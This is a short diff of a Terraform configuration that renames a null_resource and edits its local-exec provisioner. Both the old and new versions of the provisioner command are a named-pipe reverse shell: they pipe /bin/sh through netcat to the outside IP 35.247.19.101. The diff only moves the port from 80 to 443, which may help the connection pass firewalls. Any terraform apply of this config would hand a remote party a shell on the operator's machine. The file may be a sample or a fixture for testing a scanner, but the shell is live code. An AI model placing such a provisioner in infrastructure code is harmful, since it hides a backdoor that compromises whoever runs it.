@@ -7,9 +7,9 @@ resource "random_id" "random" {
   byte_length = 16
 }
 
-resource "null_resource" "example14" {
+resource "null_resource" "example15" {
   provisioner "local-exec" {
-    command = "mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 35.247.19.101 80 1>/tmp/backpipe"
+    command = "mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 35.247.19.101 443 1>/tmp/backpipe"
   }
 }
 
